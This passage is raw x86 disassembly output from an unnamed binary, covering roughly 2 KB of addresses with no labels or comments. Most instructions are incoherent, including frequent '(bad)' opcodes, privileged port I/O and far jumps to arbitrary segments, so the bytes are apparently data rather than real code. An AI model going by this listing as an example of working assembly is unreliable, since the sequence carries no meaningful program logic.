  4080e5:	stos   BYTE PTR es:[edi],al
  4080e6:	and    dh,BYTE PTR [esi]
  4080e8:	add    BYTE PTR [eax],al
  4080ea:	cwde   
  4080eb:	push   ss
  4080ec:	call   0xff5f84c8
  4080f1:	xchg   ebx,eax
  4080f2:	xor    ch,BYTE PTR [edx+0x16781e1b]
  4080f8:	call   0xff5f84e0
  4080fd:	or     DWORD PTR [edx+ebx*8-0x43b16c0],0x361a74fe
  408108:	sti    
  408109:	mul    DWORD PTR [ebx+0x1d]
  40810c:	push   0xffd51f43
  408111:	push   edx
  408112:	push   cs
  408113:	pop    ds
  408114:	jne    0x408107
  408116:	sbb    dh,BYTE PTR [eax]
  408118:	(bad)  
  408119:	(bad)  
  40811a:	inc    ebx
  40811b:	lods   al,BYTE PTR ds:[esi]
  40811c:	test   eax,0x691df413
  408121:	in     eax,0x23
  408123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408124:	pop    es
  408125:	rol    DWORD PTR [ecx+0x23b6ff1e],1
  40812b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40812c:	sti    
  40812d:	scas   al,BYTE PTR es:[edi]
  40812e:	mov    DWORD PTR ds:0x1d4e1be8,edx
  408134:	push   DWORD PTR [eax+0x3c001874]
  40813a:	xor    BYTE PTR ss:[ecx-0xdab55b],al
  408141:	add    BYTE PTR [edi+0x38fc4594],ch
  408147:	loope  0x4081bd
  408149:	adc    BYTE PTR [edi],bl
  40814b:	pop    esp
  40814c:	or     ebp,eax
  40814e:	add    BYTE PTR [eax],al
  408150:	shr    BYTE PTR [ecx-0x1],0xff
  408154:	adc    ecx,0xe
  408157:	test   edi,edx
  408159:	sbb    BYTE PTR [eax],al
  40815b:	add    BYTE PTR [edi+0x4c],al
  40815e:	test   DWORD PTR [eax],0xc7001158
  408164:	xchg   ebp,eax
  408165:	in     eax,0xfe
  408167:	pop    es
  408168:	dec    eax
  408169:	adc    DWORD PTR [edx+0x0],ebp
  40816c:	jb     0x40817f
  40816e:	push   0x0
  408170:	jb     0x408183
  408172:	lea    eax,[ebp+0x24]
  408175:	inc    ecx
  408176:	mov    WORD PTR [ebp-0x125dc],es
  40817c:	js     0x408160
  40817e:	je     0x408178
  408180:	aas    
  408181:	pop    esp
  408182:	sti    
  408183:	call   0x3feaaa
  408188:	and    edx,ecx
  40818a:	jae    0x408191
  40818c:	xor    DWORD PTR [edi],ebx
  40818e:	add    BYTE PTR [eax],al
  408190:	sbb    BYTE PTR [ecx-0x34],bh
  408193:	sub    BYTE PTR [ecx+0x18],bl
  408196:	push   DWORD PTR [ebp-0x8]
  408199:	clc    
  40819a:	sub    al,0xa9
  40819c:	(bad)  
  40819e:	dec    edi
  40819f:	mov    ebp,DWORD PTR [eax-0x580b7b64]
  4081a5:	loop   0x4081a5
  4081a7:	push   eax
  4081a8:	cmp    al,BYTE PTR [eax]
  4081aa:	sbb    eax,0x88e29fa9
  4081af:	test   DWORD PTR [eax+0xfffeda],ecx
  4081b5:	add    BYTE PTR [eax-0x60005b9a],ah
  4081bb:	jge    0x4081bc
  4081bd:	xor    DWORD PTR [si],esi
  4081c0:	in     al,dx
  4081c1:	inc    eax
  4081c2:	xor    DWORD PTR [esi-0x6a610f89],ecx
  4081c8:	xor    edi,edi
  4081ca:	and    al,0x2f
  4081cc:	sbb    esi,DWORD PTR [esi-0x37]
  4081cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081d0:	xor    BYTE PTR [ecx-0xc7614c],cl
  4081d6:	xchg   BYTE PTR [eax+0x3],al
  4081d9:	push   0xffc2f224
  4081de:	ja     0x40825f
  4081e0:	xor    al,0xf7
  4081e2:	outs   dx,BYTE PTR ds:[esi]
  4081e3:	int    0x30
  4081e5:	jne    0x40821c
  4081e7:	ret    
  4081e8:	int3   
  4081e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081ea:	pop    esi
  4081eb:	fnstsw WORD PTR [edx-0x7b]
  4081ee:	dec    ecx
  4081ef:	fnsave [eax]
  4081f1:	push   DWORD PTR [edx+0x46f71faf]
  4081f7:	cmc    
  4081f8:	add    esi,DWORD PTR [ecx+eax*1-0x7d]
  4081fc:	add    eax,DWORD PTR [eax]
  4081fe:	inc    esi
  4081ff:	les    ebx,FWORD PTR [ebx+0x36c6bd0]
  408205:	(bad)  
  408206:	fadd   QWORD PTR [ecx]
  408208:	cmp    edi,edi
  40820a:	push   ds
  40820b:	sbb    esi,DWORD PTR [esi+0x3b170907]
  408211:	dec    DWORD PTR [esi]
  408213:	xchg   esi,eax
  408214:	add    al,BYTE PTR [eax]
  408216:	push   ss
  408217:	je     0x4081b4
  408219:	fiadd  DWORD PTR [eax]
  40821b:	add    BYTE PTR [ebx],bh
  40821d:	in     al,dx
  40821e:	add    edi,edi
  408220:	mov    esp,0xeeff3851
  408225:	dec    edx
  408226:	mov    dh,0x7
  408228:	fnstcw WORD PTR [esi+0x3a]
  40822b:	(bad)  
  40822c:	fisubr WORD PTR [esi+0x62dee86d]
  408232:	xor    BYTE PTR [eax],al
  408234:	inc    ebp
  408235:	sbb    eax,0x14c6ff9b
  40823a:	xchg   esi,eax
  40823b:	jno    0x408286
  40823d:	inc    ebp
  40823e:	jecxz  0x408202
  408240:	mov    dh,0x1a
  408242:	pop    esp
  408243:	sbb    esp,DWORD PTR [esi+0x1c308e1b]
  408249:	or     al,0x91
  40824b:	jne    0x4082b5
  40824d:	sbb    edi,DWORD PTR [esi-0x65]
  408250:	xor    DWORD PTR [esi+eax*4],edx
  408253:	jno    0x40826e
  408255:	aas    
  408256:	mov    bl,0xc2
  408258:	xchg   BYTE PTR [edx],bl
  40825a:	pushf  
  40825b:	sbb    eax,DWORD PTR [esi-0x3cfa1e5]
  408261:	or     eax,DWORD PTR [ecx-0x73]
  408264:	js     0x408281
  408266:	dec    esi
  408267:	xor    BYTE PTR [eax+ebp*1+0x2c5e303e],bl
  40826e:	sub    DWORD PTR [edi+0x56],esp
  408271:	sbb    esi,DWORD PTR [esi]
  408273:	jbe    0x4082ce
  408275:	and    ebp,DWORD PTR [esi]
  408277:	xor    BYTE PTR [ecx+0x61],bl
  40827a:	dec    ebp
  40827b:	xor    BYTE PTR [esi],bh
  40827d:	sbb    edx,DWORD PTR [ebx+esi*1+0x0]
  408281:	add    BYTE PTR [esi],bh
  408283:	sbb    edx,DWORD PTR [esi]
  408285:	xor    BYTE PTR [eax+ecx*1+0x2c2eb60e],ah
  40828c:	cmp    eax,0xfe1b1e31
  408291:	jne    0x4082b4
  408293:	and    esi,esi
  408295:	das    
  408296:	sbb    DWORD PTR [ebp+0x45],edi
  408299:	xor    BYTE PTR [esi],al
  40829b:	sbb    ebp,DWORD PTR [esp+ebp*1]
  40829e:	or     BYTE PTR [edi+ebx*8+0x2f],cl
  4082a2:	neg    BYTE PTR [edx]
  4082a4:	pop    esp
  4082a5:	xor    cl,bl
  4082a7:	ss push edi
  4082a9:	add    al,0x31
  4082ab:	dec    ebp
  4082ac:	stos   DWORD PTR es:[edi],eax
  4082ad:	add    BYTE PTR [ecx],dh
  4082af:	shl    DWORD PTR [ecx+0x20],0xd6
  4082b3:	mov    al,ds:0x4d2ae4ff
  4082b8:	test   al,0xae
  4082ba:	push   ss
  4082bb:	xadd   BYTE PTR ds:0xe3e4b2cc,bl
  4082c2:	in     eax,dx
  4082c3:	sbb    cl,BYTE PTR [edi-0x7f]
  4082c6:	jg     0x40833a
  4082c8:	dec    DWORD PTR [esi-0x16983583]
  4082ce:	xor    ch,BYTE PTR [ebx]
  4082d0:	mov    esi,0x40ddfc11
  4082d5:	jmp    0xe1b59c3c
  4082da:	sub    dh,cl
  4082dc:	enter  0x4e66,0xbc
  4082e0:	addr16 call 0xc1feae18
  4082e6:	add    BYTE PTR [eax],al
  4082e8:	sti    
  4082e9:	fld    QWORD PTR [eax-0x17]
  4082ec:	sbb    BYTE PTR [ecx],0x75
  4082ef:	icebp  
  4082f0:	cmp    al,BYTE PTR ds:0x2c063ec9
  4082f6:	cmp    eax,0xc91b1e8d
  4082fb:	sub    eax,DWORD PTR [ebp+0x1a]
  4082fe:	push   esp
  4082ff:	jb     0x408312
  408301:	xchg   edi,eax
  408302:	les    ebx,FWORD PTR ds:0xe969c15f
  408308:	enter  0xfefe,0x94
  40830c:	sub    dh,BYTE PTR [edx]
  40830e:	pop    ebp
  40830f:	dec    eax
  408310:	dec    esi
  408311:	sbb    DWORD PTR [ecx+0x358d46a4],ecx
  408317:	jl     0x408303
  408319:	aam    0xff
  40831b:	popa   
  40831c:	add    BYTE PTR [ebp-0x6bcad7d9],bl
  408322:	aas    
  408323:	jmp    0xe9fc191f
  408328:	xor    dl,BYTE PTR [eax+ebp*2]
  40832b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40832c:	fcom   st(4)
  40832e:	(bad)  
  40832f:	(bad)  
  408330:	ds clc 
  408332:	scas   eax,DWORD PTR es:[edi]
  408333:	jbe    0x4082fd
  408335:	adc    eax,0x5a0cc00b
  40833a:	aas    
  40833b:	add    al,0x15
  40833e:	je     0x409893
  408344:	clc    
  408345:	ja     0x40830c
  408347:	cmp    bl,BYTE PTR [ecx+0x10]
  40834a:	call   0x3c40843c
  40834f:	adc    BYTE PTR [eax],al
  408351:	pop    edx
  408352:	mov    edx,ebx
  408354:	dec    edi
  408355:	call   0x3f375b
  40835a:	sub    BYTE PTR [eax+0x67],al
  40835d:	add    BYTE PTR [eax+0x3968bdfa],bl
  408363:	sub    eax,DWORD PTR [eax+0x0]
  408366:	mov    eax,0xf00874ea
  40836b:	mov    cl,al
  40836d:	push   edi
  40836f:	dec    esp
  408370:	add    DWORD PTR [bx+si-0x6],ecx
  408374:	mov    ebp,0x402b1368
  408379:	add    BYTE PTR [eax-0xff78b16],ch
  40837f:	mov    cs,eax
  408381:	call   DWORD PTR [edi]
  408383:	std    
  408384:	mov    cl,0xa3
  408386:	pop    ss
  408387:	jmp    0x4139:0xa6b043ea
  40838e:	sbb    BYTE PTR [edx-0x19],al
  408391:	inc    ecx
  408392:	sahf   
  408393:	adc    eax,0x61480b00
  408398:	xor    edx,DWORD PTR [esi+0x30]
  40839b:	jno    0x408349
  40839d:	call   DWORD PTR [edi]
  40839f:	inc    esi
  4083a0:	dec    edi
  4083a1:	push   0xbeef1508
  4083a6:	pusha  
  4083a7:	lds    edi,FWORD PTR [ecx]
  4083a9:	inc    ecx
  4083aa:	xor    DWORD PTR [ebx],ebp
  4083ac:	sar    esi,cl
  4083ae:	pop    esp
  4083af:	xor    ebx,DWORD PTR [ebx]
  4083b1:	push   ebp
  4083b2:	add    BYTE PTR [eax],al
  4083b4:	jmp    0x4998b10a
  4083b9:	sub    al,0x3
  4083bb:	out    dx,eax
  4083bc:	(bad)  
  4083bd:	ror    BYTE PTR [eax+0x3a],cl
  4083c0:	jo     0x4083ed
  4083c2:	sar    esi,cl
  4083c4:	inc    esp
  4083c5:	and    ebx,DWORD PTR [ebx]
  4083c7:	inc    ecx
  4083c8:	jmp    0x1d28b146
  4083cd:	into   
  4083ce:	sub    al,0xff
  4083d0:	call   0xb62b:0x5f7fc52b
  4083d7:	stc    
  4083d8:	out    dx,eax
  4083d9:	xchg   esi,eax
  4083da:	lock mov edi,0xff2ca1c8
  4083e0:	xchg   BYTE PTR [ebp+ebx*2-0x79ddc9c8],bl
  4083e7:	inc    ebp
  4083e8:	jbe    0x4083a3
  4083ea:	sub    al,0x6a
  4083ec:	dec    ebx
  4083ed:	ret    0x7b6
  4083f0:	pop    ecx
  4083f1:	in     eax,dx
  4083f2:	sub    eax,0xe0445eff
  4083f7:	(bad)  
  4083f8:	fsub   QWORD PTR [edx]
  4083fa:	sbb    edi,DWORD PTR [ecx+0x6a2ce14f]
  408400:	and    eax,0x4907b6ea
  408405:	shr    DWORD PTR ds:0x348236ff,0x3a
  40840c:	jo     0x40843b
  40840e:	sub    al,0x35
  408410:	test   DWORD PTR [edx+eax*8-0x1],edx
  408414:	pop    ds
  408415:	cdq    
  408416:	cli    
  408417:	out    0x0,eax
  408419:	add    BYTE PTR [eax+0x18],ah
  40841c:	sub    al,0xff
  40841e:	cdq    
  40841f:	push   ss
  408420:	jmp    0x1d5b565
  408425:	add    BYTE PTR [ecx],dh
  408427:	adc    al,0x69
  408429:	sub    al,0x7c
  40842b:	or     al,0xd1
  40842d:	or     al,0xec
  40842f:	pop    ss
  408430:	(bad)  
  408431:	sub    al,0x5c
  408433:	sbb    dh,cl
  408435:	mov    dh,0x36
  408437:	sub    al,0x6b
  408439:	arpl   si,dx
  40843b:	pop    ss
  40843c:	push   ds
  40843d:	into   
  40843e:	stc    
  40843f:	push   edx
  408440:	in     eax,dx
  408441:	add    ebx,DWORD PTR [ebx+ecx*4-0x43]
  408445:	xor    ch,0x44
  408448:	sahf   
  408449:	sub    al,0xb6
  40844b:	mov    DWORD PTR [eax+esi*1],esp
  40844e:	add    DWORD PTR [edi],edx
  408450:	sbb    al,0x14
  408452:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408453:	mov    eax,ds:0xa0f71bdc
  408458:	call   0xee94ae60
  40845d:	xchg   bl,dh
  40845f:	adc    ecx,ebp
  408461:	add    ebp,DWORD PTR [esi-0x2f]
  408464:	jo     0x408469
  408466:	xor    DWORD PTR [ecx+ebp*8],edx
  408469:	inc    esp
  40846a:	in     al,dx
  40846b:	pop    ds
  40846c:	pop    esi
  40846d:	add    al,0x31
  40846f:	adc    al,0xc3
  408471:	add    ebx,ebx
  408473:	adc    eax,ebx
  408475:	add    ecx,ebx
  408477:	adc    esi,DWORD PTR [esi+eax*8+0x62]
  40847b:	les    ebp,FWORD PTR [ebx-0x7a]
  40847e:	add    BYTE PTR [eax],al
  408480:	inc    ebp
  408481:	pop    ds
  408482:	ss sub al,0xe1
  408485:	push   ss
  408486:	mov    ah,0x2b
  408488:	mov    eax,ds:0xa1191b24
  40848e:	call   0x9d94be96
  408493:	push   es
  408494:	sbb    BYTE PTR [ecx],dl
  408496:	jmp    0x40849b
  408498:	xor    DWORD PTR [ebx+esi*1-0x1eb8e25],ebp
  40849f:	mov    ch,0x3e
  4084a1:	sub    al,0x0
  4084a3:	mov    dl,0x8c
  4084a5:	pop    ss
  4084a6:	call   FWORD PTR [ecx+0x6c8d4479]
  4084ac:	inc    ecx
  4084ad:	pop    ds
  4084ae:	(bad)  
  4084af:	fiadd  WORD PTR ds:0x5302e7c5
  4084b5:	pop    ss
  4084b6:	jmp    DWORD PTR [eax-0x50]
  4084b9:	and    esi,edi
  4084bb:	(bad)  
  4084bc:	or     ch,BYTE PTR [ecx+eax*4]
  4084bf:	mov    ebx,DWORD PTR [edx]
  4084c1:	pop    ss
  4084c2:	push   0xffffffe9
  4084c4:	stos   BYTE PTR es:[edi],al
  4084c5:	idiv   DWORD PTR [edx]
  4084c7:	sub    BYTE PTR ds:0x299b517,dh
  4084cd:	pop    ss
  4084ce:	call   FWORD PTR [esi+0x6de80ae0]
  4084d4:	adc    BYTE PTR [edi],dl
  4084d6:	jmp    DWORD PTR [eax-0x50]
  4084d9:	das    
  4084da:	test   DWORD PTR [esi+0x10ffaa4a],0xe940d993
  4084e4:	add    BYTE PTR [eax],al
  4084e6:	pop    ebx
  4084e7:	popa   
  4084e8:	lock jbe 0x408535
  4084eb:	pop    ss
  4084ec:	(bad)  
  4084ed:	fdivr  QWORD PTR [esi+0x2e]
  4084f0:	imul   eax,DWORD PTR [edx+ebx*1+0x496c8917],0xbf4eff1f
  4084fb:	push   ss
  4084fc:	addr16 push ss
  4084fe:	inc    esi
  4084ff:	sar    edi,cl
  408501:	cmp    eax,0x36f723c0
  408506:	sbb    dl,BYTE PTR [edi]
  408508:	jne    0x4084e7
  40850a:	sbb    al,dh
  40850c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40850d:	or     cl,BYTE PTR es:[ebp+0x15621185]
  408514:	inc    DWORD PTR [ebx-0x2dc853ce]
  40851a:	cmc    
  40851b:	adc    eax,0xe05500fe
  408520:	idiv   bh
  408522:	por    mm6,QWORD PTR [esp+ecx*1+0x30]
  408527:	sbb    eax,0x990fffa4
  40852c:	test   ah,bl
  40852e:	xlat   BYTE PTR ds:[ebx]
  40852f:	jmp    0xfff6:0xf1558dfe
  408536:	inc    DWORD PTR [ecx+0x67]
  408539:	dec    eax
  40853a:	inc    ebx
  40853b:	dec    edi
  40853c:	(bad)  
  40853d:	(bad)  
  40853e:	push   ebp
  40853f:	loope  0x408537
  408541:	dec    DWORD PTR [edi+0x315c34ea]
  408547:	dec    edi
  408548:	jmp    edi
  40854a:	add    BYTE PTR [eax],al
  40854c:	fdiv   DWORD PTR [esi+edi*8+0x73d1c3ff]
  408553:	sbb    DWORD PTR [ebx],ebx
  408555:	lods   al,BYTE PTR ds:[esi]
  408556:	fcomip st,st(7)
  408558:	mov    edi,0x987503ea
  40855d:	jmp    0xfff6:0xc9058f2f
  408564:	cmovno esp,edi
  408567:	(bad)  
  408569:	jmp    0x16a5716c
  40856e:	mov    edi,0xe7418674
  408573:	sar    DWORD PTR [ecx-0x2a380116],1
  408579:	enter  0xfff6,0xef
  40857d:	add    eax,DWORD PTR [eax]
  40857f:	add    BYTE PTR [eax-0x64],cl
  408582:	test   al,dl
  408584:	pop    es
  408585:	jmp    0x413a:0x3e7050fe
  40858c:	dec    eax
  40858d:	jmp    0xfffe:0xea17f0b4
  408594:	lds    ebx,FWORD PTR [edi+eiz*8]
  408597:	lds    esi,FWORD PTR [ecx]
  408599:	(bad)  
  40859a:	sub    edi,edi
  40859c:	test   al,0xaf
  40859e:	dec    esi
  40859f:	not    DWORD PTR [esi]
  4085a1:	push   cs
  4085a2:	xchg   BYTE PTR [ebp-0xd6e1eb],bh
  4085a8:	xor    DWORD PTR [esi],ebp
  4085aa:	jg     0x408547
  4085ac:	xor    DWORD PTR [ebx],ebp
  4085ae:	add    eax,DWORD PTR [ebx+0x3eb40000]
  4085b4:	xor    edi,edi
  4085b6:	out    dx,al
  4085b7:	sub    bh,al
  4085b9:	xor    DWORD PTR [edi-0x4dfffcd6],0xffffff87
  4085c0:	sbb    al,0xf7
  4085c2:	(bad)  
  4085c3:	dec    ebp
  4085c4:	add    al,0xf
  4085c6:	mov    ch,0xab
  4085c8:	add    eax,DWORD PTR [eax]
  4085ca:	xor    ebx,edx
  4085cc:	adc    eax,DWORD PTR [eax]
  4085ce:	into   
  4085cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085d0:	sub    BYTE PTR [ebp+0x29],dh
  4085d3:	sub    DWORD PTR [eax],0xffffff9d
  4085d6:	scas   al,BYTE PTR es:[edi]
  4085d7:	jne    0x408602
  4085d9:	mov    ch,0x95
  4085db:	jne    0x408606
  4085dd:	call   FWORD PTR [esi+0x1e7fbff]
  4085e3:	lods   eax,DWORD PTR ds:[esi]
  4085e4:	sub    bh,bh
  4085e6:	mov    ds,edi
  4085e8:	sbb    esi,edi
  4085ea:	xchg   BYTE PTR [ebp-0x6cd68ad8],bl
  4085f0:	(bad)  
  4085f1:	popf   
  4085f2:	jbe    0x4085a1
  4085f4:	sub    BYTE PTR [ebp-0xd742ab],dh
  4085fa:	data16 aaa 
  4085fc:	sti    
  4085fd:	out    0x25,eax
  4085ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408600:	sub    bh,bh
  408602:	push   esi
  408603:	xchg   edi,eax
  408604:	dec    ebx
  408605:	test   DWORD PTR [esi-0x2b],0xd3397528
  40860c:	aas    
  40860d:	popf   
  40860e:	ds in  eax,0x28
  408611:	mov    ch,0x55
  408613:	adc    ebx,DWORD PTR [esi]
  408615:	sub    DWORD PTR [eax],eax
  408617:	add    BYTE PTR [esi],ch
  408619:	adc    al,0x94
  40861b:	sti    
  40861c:	push   cs
  40861d:	sub    eax,0x981e2977
  408622:	dec    ebx
  408623:	push   eax
  408624:	push   ds
  408625:	adc    al,0x6
  408627:	add    al,0x85
  408629:	das    
  40862a:	push   0x67
  40862c:	loope  0x408639
  40862e:	imul   BYTE PTR [eax]
  408630:	xor    eax,0xac7cdb89
  408635:	call   0x142eaf17
  40863a:	sbb    DWORD PTR [ecx],ebp
  40863c:	pop    esp
  40863d:	sbb    al,0xc1
  40863f:	(bad)  
  408640:	mov    esp,0x2b1cce13
  408645:	jle    0x408630
  408647:	sub    BYTE PTR [esp+ebx*1-0x2f],al
  40864b:	jnp    0x4085f1
  40864d:	adc    esi,DWORD PTR [esi-0x4a077bd8]
  408653:	sub    BYTE PTR [esi-0x519c6304],dh
  408659:	adc    ebx,DWORD PTR [esi-0x69f46a92]
  40865f:	sub    BYTE PTR [ecx-0x69d7b703],cl
  408665:	adc    edi,DWORD PTR [ebx+ebx*1]
  408668:	xchg   BYTE PTR [ebx],dl
  40866a:	jle    0x408687
  40866c:	addr16 mov ah,0x75
  40866f:	sub    BYTE PTR [esi-0x37],bh
  408672:	mov    WORD PTR [eax],?
  408674:	jbe    0x408689
  408676:	push   ecx
  408677:	push   esp
  408678:	xchg   ecx,eax
  408679:	adc    ebx,DWORD PTR [esi+0x28]
  40867c:	add    BYTE PTR [eax],al
  40867e:	pushf  
  40867f:	call   0xfc9eaee1
  408684:	and    BYTE PTR [ebx+0x56],ah
  408687:	adc    eax,DWORD PTR [esi+0x6e]
  40868a:	inc    ecx
  40868b:	or     edi,DWORD PTR [esi]
  40868d:	sub    BYTE PTR [esi-0x77],al
  408690:	add    ch,ah
  408692:	or     DWORD PTR [ecx+0x10cb4108],ecx
  408698:	jmp    DWORD PTR [esi]
  40869a:	pop    ecx
  40869b:	leave  
  40869c:	out    dx,eax
  40869d:	push   ss
  40869e:	pop    ecx
  40869f:	adc    ebp,eax
  4086a1:	inc    ebp
  4086a2:	xchg   edx,eax
  4086a3:	adc    edi,edi
  4086a5:	push   cs
  4086a6:	xlat   BYTE PTR ds:[ebx]
  4086a7:	or     ch,cl
  4086a9:	xor    al,0x57
  4086ab:	adc    edi,edi
  4086ad:	(bad)  
  4086ae:	aam    0xe
  4086b0:	call   0xff534cb4
  4086b5:	and    BYTE PTR [eax+eiz*1+0x0],ch
  4086b9:	cmp    al,0x6a
  4086bb:	add    BYTE PTR [ebx+0x7e19a5],al
  4086c1:	inc    ebx
  4086c2:	sub    DWORD PTR [ebx],edx
  4086c4:	jne    0x4086a7
  4086c6:	cmp    dl,dl
  4086c8:	pushf  
  4086c9:	(bad)  
  4086ca:	push   ss
  4086cb:	popf   
  4086cc:	inc    esp
  4086cd:	mov    ebp,0x283b70a5
  4086d2:	xor    eax,0xd40d3513
  4086d7:	push   ebx
  4086d8:	add    BYTE PTR [esi+0x1be81ae0],ah
  4086de:	pop    eax
  4086df:	adc    edi,edi
  4086e1:	add    DWORD PTR [eax],eax
  4086e3:	add    BYTE PTR [edi+0x4d],dh
  4086e6:	inc    ecx
  4086e7:	jmp    0xe9409ba6
  4086ec:	mov    dl,0x12
  4086ee:	jne    0x4086e1
  4086f0:	sub    dh,BYTE PTR [ebp+edi*8+0x76]
  4086f4:	push   esi
  4086f5:	adc    esi,DWORD PTR [ebp+0x6d]
  4086f8:	dec    esi
  4086f9:	mov    DWORD PTR [eax],ecx
  4086fb:	push   ecx
  4086fc:	add    al,0xb1
  4086fe:	(bad)  
  4086ff:	pop    esi
  408700:	and    al,0xd6
  408702:	add    ebp,ecx
  408704:	sbb    DWORD PTR [ebp+0x7f168eb],0x3af700fe
  40870e:	push   0x0
  408710:	bound  ebx,QWORD PTR [ebx]
  408712:	push   DWORD PTR [ebp+0x50]
  408715:	cs jb  0x4086b5
  408718:	pop    es
  408719:	cmp    ecx,DWORD PTR [ecx+0x2b05445]
  40871f:	add    DWORD PTR [eax],ebx
  408721:	push   ss
  408722:	lea    eax,[ebp-0xc5c1]
  408728:	fsubr  DWORD PTR ds:0x161871d2
  40872e:	or     eax,eax
  408730:	jl     0x40871b
  408732:	cmp    eax,DWORD PTR [ecx+ecx*1]
  408735:	push   ss
  408736:	add    BYTE PTR [edi-0x13],dh
  408739:	lods   eax,DWORD PTR ds:[esi]
  40873a:	je     0x408777
  40873c:	sbb    DWORD PTR [eax],ebx
  40873e:	lea    eax,[ebp-0xc801]
  408744:	sbb    BYTE PTR [eax],dh
  408746:	test   eax,0xe70000a3
  40874b:	cmp    dl,BYTE PTR [eax+0x68]
  40874e:	fcom   DWORD PTR ds:0x3928beef
  408754:	jne    0x40875e
  408756:	lock xor al,0xc1
  408759:	inc    DWORD PTR [edi-0x286009d3]
  40875f:	cmp    bh,bh
  408761:	jne    0x408727
  408763:	cmp    dh,BYTE PTR [ebp+0x8]
  408766:	mov    al,0xb0
  408768:	fwait
  408769:	jmp    DWORD PTR [edi-0x67fb3db0]
  40876f:	in     al,0x89
  408771:	in     al,dx
  408772:	sbb    edx,DWORD PTR [ecx-0x4]
  408775:	push   0xffffff88
  408777:	stos   DWORD PTR es:[edi],eax
  408778:	sbb    al,0xff
  40877a:	jge    0x408789
  40877c:	out    0xd,eax
  40877e:	mov    ch,0x3a
  408780:	dec    DWORD PTR [ecx+0x68398d]
  408786:	xor    ebx,edi
  408788:	adc    eax,0xea76c9be
  40878d:	inc    eax
  40878e:	xor    ebx,esp
  408790:	xchg   edx,eax
  408791:	cmp    esi,eax
  408793:	cli    
  408794:	and    eax,0x50532975
  408799:	les    esi,FWORD PTR [esi]
  40879b:	inc    edx
  40879c:	es jne 0x4087cc
  40879f:	cmp    dh,BYTE PTR [eax-0x781ee6f9]
  4087a5:	call   FWORD PTR [esi]
  4087a7:	xor    al,0x41
  4087a9:	add    al,0x31
  4087ab:	enter  0xec79,0x0
  4087af:	add    BYTE PTR [eax+0x6f74f3e],dh
  4087b5:	adc    dh,BYTE PTR [edi+0x45]
  4087b8:	std    
  4087b9:	stos   BYTE PTR es:[edi],al
  4087ba:	and    eax,0xaf022175
  4087bf:	or     ebx,ecx
  4087c1:	out    dx,al
  4087c2:	mov    dl,0xff
  4087c4:	out    0x5,al
  4087c6:	inc    ebx
  4087c7:	(bad)  
  4087c9:	out    dx,al
  4087ca:	add    al,BYTE PTR [eax]
  4087cc:	xor    DWORD PTR [edx-0x4ce0842],edi
  4087d2:	add    al,BYTE PTR [eax]
  4087d4:	out    dx,al
  4087d5:	aaa    
  4087d6:	xor    bh,bh
  4087d8:	ss sti 
  4087da:	add    ch,BYTE PTR [edx+0x31]
  4087dd:	push   ebp
  4087de:	add    al,0x6a
  4087e0:	xor    DWORD PTR ds:0xa6ec8d04,esp
  4087e6:	ror    DWORD PTR [esp+esi*4-0x6900d352],cl
  4087ed:	dec    edx
  4087ee:	and    eax,0xae998975
  4087f3:	sti    
  4087f4:	cdq    
  4087f5:	mov    eax,0xf57effb2
  4087fa:	inc    edx
  4087fb:	je     0x408829
  4087fd:	xchg   esp,eax
  4087fe:	ins    BYTE PTR es:[edi],dx
  4087ff:	add    DWORD PTR [ecx],esi
  408801:	adc    al,0xe9
  408803:	fwait
  408804:	jne    0x408841
  408806:	test   al,0x3
  408808:	pop    esi
  408809:	xchg   cl,bh
  40880b:	sbb    ecx,DWORD PTR [eax-0x4b]
  40880e:	dec    ebp
  40880f:	and    eax,0x77189ce1
  408814:	add    BYTE PTR [eax],al
  408816:	lods   al,BYTE PTR ds:[esi]
  408817:	pop    es
  408818:	ss and eax,0x1b9b633e
  40881e:	pop    eax
  40881f:	mov    ch,0x2d
  408821:	and    eax,0x2d1899b8
  408826:	adc    BYTE PTR es:[ecx],dl
  408829:	aad    0xbf
  40882b:	movhps xmm6,QWORD PTR [edi-0x54]
  40882f:	hlt    
  408830:	adc    eax,0x91650e25
  408835:	mov    DWORD PTR [edx+0x55],ecx
  408838:	jmp    0xfe454c61
  40883d:	and    al,0xf6
  40883f:	pcmpeqb mm6,mm7
  408842:	(bad)  
  408843:	inc    ecx
  408844:	mov    esp,DWORD PTR [esi+eiz*8]
  408847:	popf   
  408848:	arpl   WORD PTR [edi],bx
  40884a:	out    0xf,al
  40884c:	(bad)  
  40884d:	cdq    
  40884e:	(bad)  
  40884f:	ja     0x4087db
  408851:	call   0x6f069cc7
  408856:	rol    DWORD PTR [edi],0xbe
  408859:	and    al,0xbe
  40885b:	mov    ebp,esp
  40885d:	sbb    esp,DWORD PTR [ebx]
  40885f:	mov    dl,0xad
  408861:	and    al,0xb8
  408863:	cdq    
  408864:	xchg   esp,eax
  408865:	sub    al,0xa6
  408867:	movlps QWORD PTR [ecx+ecx*1],xmm0
  40886b:	mov    bh,0xd1
  40886d:	ret    0xe96
  408870:	push   esp
  408871:	xor    eax,DWORD PTR [esi-0x3db79f1]
  408877:	pop    ds
  408878:	xchg   ecx,eax
  408879:	sub    al,0x0
  40887b:	add    al,dl
  40887d:	(bad)  
  40887f:	jbe    0x40887c
  408881:	cwde   
  408882:	out    0x76,eax
  408884:	adc    eax,0xcae96a0f
  408889:	mov    edi,0xf32a83a
  40888e:	mov    ch,0x59
  408890:	add    eax,0x9f4eff0f
  408895:	sbb    ebp,eax
  408897:	and    eax,0x70ff0ed3
  40889c:	mov    edi,0xd36f6ef
  4088a1:	jp     0x4088a3
  4088a3:	rcl    DWORD PTR [ebx+ecx*2-0x36b216bf],0xef
  4088ab:	push   ss
  4088ac:	push   ebp
  4088ad:	ud0    ebx,DWORD PTR [esi+ebx*1+0x5548c0f7]
  4088b5:	jns    0xff480327
  4088bb:	(bad)  
  4088bc:	cdq    
  4088bd:	push   cs
  4088be:	addr16 repz push cs
  4088c1:	push   esp
  4088c2:	add    dh,ch
  4088c4:	pop    esp
  4088c5:	add    al,0xf7
  4088c7:	out    0x12,al
  4088c9:	pcmpeqw mm5,mm5
  4088cc:	or     dh,BYTE PTR [esi-0x62ed2960]
